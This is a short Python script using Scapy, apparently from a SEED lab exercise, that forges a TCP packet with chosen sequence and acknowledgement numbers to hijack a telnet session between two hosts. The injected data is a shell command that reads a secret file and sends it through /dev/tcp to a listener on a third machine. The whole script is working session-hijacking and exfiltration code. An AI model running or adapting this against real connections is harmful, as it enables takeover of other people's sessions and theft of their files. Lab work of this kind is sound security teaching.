from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=33748, dport=23, flags="A", seq=1843486262, ack=1268103583)
data = "\n cat /home/seed/secret > /dev/tcp/172.31.13.90/9090\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)